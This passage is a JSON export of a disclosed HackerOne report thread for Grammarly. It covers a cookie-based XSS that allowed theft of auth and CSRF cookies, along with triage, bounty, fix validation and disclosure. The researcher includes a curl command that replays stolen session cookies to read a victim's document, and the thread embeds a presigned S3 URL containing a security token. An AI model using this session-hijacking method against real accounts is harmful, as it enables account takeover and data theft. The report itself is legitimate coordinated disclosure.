href=\"/k4r4koyun\"\u003e@k4r4koyun\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-10T16:16:09.036Z","updated_at":"2019-04-10T16:16:09.036Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4531557,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-10T16:53:05.205Z","updated_at":"2019-04-10T16:53:05.205Z","additional_data":{"old_severity":"Critical","new_severity":"High (8.0)","old_severity_id":342812,"new_severity_id":342949},"actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4531698,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @k4r4koyun,\nI was able to replicate your POC and intercept the cookie. However, I was unable to access/takeover another user's account. Can you update your POC to include obtaining information or taking over another user's account? Your input is appreciated,\n@Sodacan","markdown_message":"\u003cp\u003eHi \u003ca href=\"/k4r4koyun\"\u003e@k4r4koyun\u003c/a\u003e,\u003cbr\u003e\nI was able to replicate your POC and intercept the cookie. However, I was unable to access/takeover another user\u0026#39;s account. Can you update your POC to include obtaining information or taking over another user\u0026#39;s account? Your input is appreciated,\u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@Sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-10T17:20:41.504Z","updated_at":"2019-04-10T17:20:41.504Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4532374,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Of course. Lets assume that you have successfully collected the authentication cookie of the victim (also the csrf-token which is a cookie itself,  just to be sure). To access his/her account, all you have to do is use the grauth and the csrf-token cookies with your requests. An example cURL command can be found below:\n\n`curl https://app.grammarly.com/ddocs/417782102 --cookie \"███\" --cookie \"████\" -I`\n\nIt will try to get a document which belongs to the victim (417782102 belongs to █████ for example, which is my test account). The cookie values in that request also belong to my session, you can replace them with another users cookie values.\n\nI have logged in via \"Google Chrome 69.0.3497.92 (Official Build) (64-bit)\" and got the cookie values. Then (as you can see in the attached image) I've tried to send the mentioned cURL request from 2 different IP addresses. The first one is the IP address that I've logged in from and the second IP address belongs to my mobile cell provider. I was able to get HTTP 200 response for both requests. Non-valid cookies get a HTTP response of 301 (redirection to the login page).\n\nUnfortunately my internet access right now is pretty limited. If you have any further questions or would like to see a video PoC on it, I can send it tomorrow. ","markdown_message":"\u003cp\u003eOf course. Lets assume that you have successfully collected the authentication cookie of the victim (also the csrf-token which is a cookie itself,  just to be sure). To access his/her account, all you have to do is use the grauth and the csrf-token cookies with your requests. An example cURL command can be found below:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ecurl https://app.grammarly.com/ddocs/417782102 --cookie \u0026quot;███\u0026quot; --cookie \u0026quot;████\u0026quot; -I\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eIt will try to get a document which belongs to the victim (417782102 belongs to █████ for example, which is my test account). The cookie values in that request also belong to my session, you can replace them with another users cookie values.\u003c/p\u003e\n\n\u003cp\u003eI have logged in via \u0026quot;Google Chrome 69.0.3497.92 (Official Build) (64-bit)\u0026quot; and got the cookie values. Then (as you can see in the attached image) I\u0026#39;ve tried to send the mentioned cURL request from 2 different IP addresses. The first one is the IP address that I\u0026#39;ve logged in from and the second IP address belongs to my mobile cell provider. I was able to get HTTP 200 response for both requests. Non-valid cookies get a HTTP response of 301 (redirection to the login page).\u003c/p\u003e\n\n\u003cp\u003eUnfortunately my internet access right now is pretty limited. If you have any further questions or would like to see a video PoC on it, I can send it tomorrow. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-10T18:57:42.846Z","updated_at":"2019-11-06T15:08:23.671Z","actor":{"username":"k4r4koyun","cleared":false,"url":"/k4r4koyun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/365/149/67936a3b1d8aaa431fe278e1b8e50401135d76a0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":466251,"filename":"Grammarly_POC.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/466/251/79ce54656287e8bc74c6091bc884e3fc6204e47a/Grammarly_POC.png?response-content-disposition=attachment%3B%20filename%3D%22Grammarly_POC.png%22%3B%20filename%2A%3DUTF-8%27%27Grammarly_POC.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6SZWJ7EV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061542Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDnUzI%2BFGOFBLAScWuVOL4Lj3JmbbQAzP3Z0CGixtLCuAIgQzjjEEfRLfyvyTUcWPuh1TmLwtvXfhn4Y1cmYaMrO6cqtAMIVRABGgwwMTM2MTkyNzQ4NDkiDGp%2BpnVA5musWTL7NCqRA8%2FtWDfuTNl%2BTEZ8%2F83sOgEjGfhPO7hqas9S5YFvyrG29udKPmtcuewMHQFGoWh6uvbSTE9LPEkFDl6RosJJJY3ZsFaD9BGxtIOBINUPfZd26XnOL01fuCQ8x%2BiErJvv8vHBR5mWXV7L6t7A2%2F5H8dY91iEQFmPdZboRnRed4t2q9jcZCwrkzHwMk8bNRFkfRqzqUB6%2Buk39e4oyKwiyqROwDwnoUxIOrVdA29STuUYzszGBQ%2B3Eg%2Fr4I9Ys7sDaoYDHJAVEt%2F6kVnewTLU3uHfL%2F%2FzDR0ZnJa5Oo%2BmValn4%2Fn34Ke7o7csnn3piiGYIK4mihEWUVtJZnq0bZ%2BEU14q4ZLfb79tvTTKy5%2B9XC3vM1tWdFU6K%2F2PISAY5LoVEscNgJL0aQIq7sAX0f00Uyo2TeQTR%2B9TUOeUvW40metpNAt6ZQ8u0%2BuTZij%2FLNaYEe6v5RA7Fg8wzm%2Bu7IVusddMT4HgUuba3afxdFVj8x9iXROa6QZZ%2BdlHYNGywE8eJxO3jkpwbaZpUg8PZ17ztcb5%2BMLHSqv8FOusBshs3Z1RNetRK0o6yVAL2zGdldUlxbnMrusEP31v5WyfcSXKYrW1oJGSAAOlTEHZOawyDOEVKZdmLftLsa7vpv4NkkvDc0MjvNZjQrLWiuTmEalVC704buBLYftchmedTLOrsCMIpwWkxoPJnEqO2VZwPnup4B1lMH%2B%2FHO0btRwbDEfX1bZu7nae%2FPoCvN9o%2FT1iQ8GcaSv5OUJxppuy2cagjSuiUWEkOXPhYiBKpxTQMFIMtd6%2FpRtJ2YeCQgmRXXl1K6ayBDQAQxWFeKQPM5vtrAzDrzE9Adaqtb3AdlxqDjg74xdcM9YFdyg%3D%3D\u0026X-Amz-Signature=e5ce9efb4fb45fe5b3977515e270d91d1710600e35eed608f6622b4125020afa"}],"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4539873,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-11T15:08:07.478Z","updated_at":"2019-04-11T15:08:07.478Z","additional_data":{"old_severity":"High (8.0)","new_severity":"High (7.6)","old_severity_id":342949,"new_severity_id":344272},"actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4539884,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-11T15:09:28.861Z","updated_at":"2019-04-11T15:09:28.861Z","additional_data":{"old_severity":"High (7.6)","new_severity":"High (8.7)","old_severity_id":344272,"new_severity_id":344274},"actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4539886,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @k4r4koyun,\n\nThank you for your submission! I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@sodacan\n","markdown_message":"\u003cp\u003eHello \u003ca href=\"/k4r4koyun\"\u003e@k4r4koyun\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-11T15:09:52.531Z","updated_at":"2019-04-11T15:09:52.531Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4539893,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-11T15:10:56.610Z","updated_at":"2019-04-11T15:10:56.610Z","additional_data":{"old_severity":"High (8.7)","new_severity":"Medium (6.8)","old_severity_id":344274,"new_severity_id":344275},"actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4539899,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-11T15:12:06.016Z","updated_at":"2019-04-11T15:12:06.016Z","additional_data":{"old_severity":"Medium (6.8)","new_severity":"High (8.2)","old_severity_id":344275,"new_severity_id":344276},"actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4539983,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the heads up! I am glad to hear that our findings were actually useful in aiding the overall security of Grammarly. I was wondering if it's possible to add a collaborator for this report and split the bounty somehow? The user \"newbie06\" and I have worked on this scenario together.","markdown_message":"\u003cp\u003eThanks for the heads up! I am glad to hear that our findings were actually useful in aiding the overall security of Grammarly. I was wondering if it\u0026#39;s possible to add a collaborator for this report and split the bounty somehow? The user \u0026quot;newbie06\u0026quot; and I have worked on this scenario together.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-11T15:29:49.970Z","updated_at":"2019-04-11T15:29:49.970Z","actor":{"username":"k4r4koyun","cleared":false,"url":"/k4r4koyun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/365/149/67936a3b1d8aaa431fe278e1b8e50401135d76a0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4540028,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@k4r4koyun You could add collaborator from your side","markdown_message":"\u003cp\u003e\u003ca href=\"/k4r4koyun\"\u003e@k4r4koyun\u003c/a\u003e You could add collaborator from your side\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-11T15:35:53.037Z","updated_at":"2019-04-11T15:35:53.037Z","actor":{"username":"vladimir_suslenko","cleared":false,"url":"/vladimir_suslenko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4540162,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I have looked at the header of our report and could not see a \"Manage Collaborators\" button. Could it be possible that Grammarly has not enabled this feature or could it be missing because of another reason (such as signal level or reputation)?","markdown_message":"\u003cp\u003eI have looked at the header of our report and could not see a \u0026quot;Manage Collaborators\u0026quot; button. Could it be possible that Grammarly has not enabled this feature or could it be missing because of another reason (such as signal level or reputation)?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-11T15:43:42.003Z","updated_at":"2019-04-11T15:43:42.003Z","actor":{"username":"k4r4koyun","cleared":false,"url":"/k4r4koyun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/365/149/67936a3b1d8aaa431fe278e1b8e50401135d76a0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4542104,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@k4r4koyun and @vladimir_suslenko \nThe requested user has been added to the report.\n@sodacan","markdown_message":"\u003cp\u003e\u003ca href=\"/k4r4koyun\"\u003e@k4r4koyun\u003c/a\u003e and \u003ca href=\"/vladimir_suslenko\"\u003e@vladimir_suslenko\u003c/a\u003e \u003cbr\u003e\nThe requested user has been added to the report.\u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-11T18:22:17.781Z","updated_at":"2019-04-11T18:22:17.781Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4542484,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-11T19:47:39.959Z","updated_at":"2019-04-11T19:47:39.959Z","actor":{"username":"andriy_derevyanko","cleared":false,"url":"/andriy_derevyanko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/232/429/8d025f5ca823ddfa62ce186084ff79b3e72542ed_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4542485,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-11T19:48:18.397Z","updated_at":"2019-04-11T19:48:18.397Z","actor":{"url":"/grammarly","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/746/a2bf7f90c683af5214fcc74c1df6804286ee97ce_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Grammarly"}},"bounty_amount":"1750.0","bounty_currency":"usd","bonus_amount":"250.0","genius_execution_id":null,"team_handle":"grammarly","collaborator":{"username":"k4r4koyun","url":"/k4r4koyun"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4546151,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty! I am waiting for the fix, will re-check the attack scenario as soon as you fix it.\n\n(Note: The user \"newbie06\" is still not in the Participants list. I'm not sure about the reason but I've created a support ticket at HackerOne. Maybe it is a bug but I have no idea how collaboration works and this is my first report, so if any HackerOne personnel could explain this issue, that would be great.)","markdown_message":"\u003cp\u003eThanks for the bounty! I am waiting for the fix, will re-check the attack scenario as soon as you fix it.\u003c/p\u003e\n\n\u003cp\u003e(Note: The user \u0026quot;newbie06\u0026quot; is still not in the Participants list. I\u0026#39;m not sure about the reason but I\u0026#39;ve created a support ticket at HackerOne. Maybe it is a bug but I have no idea how collaboration works and this is my first report, so if any HackerOne personnel could explain this issue, that would be great.)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-12T09:07:04.834Z","updated_at":"2019-04-12T09:07:04.834Z","actor":{"username":"k4r4koyun","cleared":false,"url":"/k4r4koyun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/365/149/67936a3b1d8aaa431fe278e1b8e50401135d76a0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4583916,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for your report @k4r4koyun, @newbie06! \nThis vulnerability must be resolved now. Can you validate the fix?","markdown_message":"\u003cp\u003eThanks for your report \u003ca href=\"/k4r4koyun\"\u003e@k4r4koyun\u003c/a\u003e, \u003ca href=\"/newbie06\"\u003e@newbie06\u003c/a\u003e! \u003cbr\u003e\nThis vulnerability must be resolved now. Can you validate the fix?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-17T13:43:19.282Z","updated_at":"2019-04-17T13:43:19.282Z","actor":{"username":"vladimir_suslenko","cleared":false,"url":"/vladimir_suslenko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"k4r4koyun","url":"/k4r4koyun"},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4585724,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"* Setting/getting \"grauth\" cookie: Not in the whitelist, thus gnar.grammarly.com is not able to reach it. (OK)\n* Setting/getting \"csrf-token\" cookie: Not in the whitelist, thus gnar.grammarly.com is not able to reach it. (OK)\n* XSS over \"gnar_containerId\" cookie: It is in the whitelist however www.grammarly.com resets it before sending it back to the user whenever characters such as \"\u003c ' \" \u003e\" appear in the cookie, or at least that is what I've deduced. (OK)\n\nThanks for letting us know and fixing this issue quickly. I have traced my steps and was able to verify that the issue does not exist anymore!","markdown_message":"\u003cul\u003e\n\u003cli\u003eSetting/getting \u0026quot;grauth\u0026quot; cookie: Not in the whitelist, thus gnar.grammarly.com is not able to reach it. (OK)\u003c/li\u003e\n\u003cli\u003eSetting/getting \u0026quot;csrf-token\u0026quot; cookie: Not in the whitelist, thus gnar.grammarly.com is not able to reach it. (OK)\u003c/li\u003e\n\u003cli\u003eXSS over \u0026quot;gnar_containerId\u0026quot; cookie: It is in the whitelist however \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.grammarly.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.grammarly.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e resets it before sending it back to the user whenever characters such as \u0026quot;\u0026lt; \u0026#39; \u0026quot; \u0026gt;\u0026quot; appear in the cookie, or at least that is what I\u0026#39;ve deduced. (OK)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThanks for letting us know and fixing this issue quickly. I have traced my steps and was able to verify that the issue does not exist anymore!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-17T17:07:46.682Z","updated_at":"2019-04-17T17:07:46.682Z","actor":{"username":"k4r4koyun","cleared":false,"url":"/k4r4koyun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/365/149/67936a3b1d8aaa431fe278e1b8e50401135d76a0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4587507,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for validating the fix, @k4r4koyun!","markdown_message":"\u003cp\u003eThanks for validating the fix, \u003ca href=\"/k4r4koyun\"\u003e@k4r4koyun\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-17T22:08:00.627Z","updated_at":"2019-04-17T22:08:00.627Z","actor":{"username":"vladimir_suslenko","cleared":false,"url":"/vladimir_suslenko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6206087,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Could we disclose this one, maybe only with the summary (as the report contains auth cookies and whatnot)?","markdown_message":"\u003cp\u003eCould we disclose this one, maybe only with the summary (as the report contains auth cookies and whatnot)?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-03T20:59:28.870Z","updated_at":"2019-11-03T20:59:28.870Z","first_to_agree":true,"actor":{"username":"k4r4koyun","cleared":false,"url":"/k4r4koyun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/365/149/67936a3b1d8aaa431fe278e1b8e50401135d76a0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6232073,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@k4r4koyun, sensitive data was redacted. Please, let us know if you're ok with full disclosure.","markdown_message":"\u003cp\u003e\u003ca href=\"/k4r4koyun\"\u003e@k4r4koyun\u003c/a\u003e, sensitive data was redacted. Please, let us know if you\u0026#39;re ok with full disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-06T15:10:36.160Z","updated_at":"2019-11-06T15:10:36.160Z","actor":{"username":"vladimir_suslenko","cleared":false,"url":"/vladimir_suslenko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6242690,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure no problem, I am OK with full disclosure. ","markdown_message":"\u003cp\u003eSure no problem, I am OK with full disclosure. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-07T16:17:48.175Z","updated_at":"2019-11-07T16:17:48.175Z","actor":{"username":"k4r4koyun","cleared":false,"url":"/k4r4koyun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/365/149/67936a3b1d8aaa431fe278e1b8e50401135d76a0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6321589,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there, any updates on the disclosure fellas? ","markdown_message":"\u003cp\u003eHey there, any updates on the disclosure fellas? \u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-16T06:55:00.678Z","updated_at":"2019-11-16T06:55:00.678Z","actor":{"username":"k4r4koyun","cleared":false,"url":"/k4r4koyun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/365/149/67936a3b1d8aaa431fe278e1b8e50401135d76a0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6461734,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-03T20:59:30.626Z","updated_at":"2019-12-03T20:59:30.626Z","actor":{"url":"/grammarly","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/746/a2bf7f90c683af5214fcc74c1df6804286ee97ce_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Grammarly"}},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}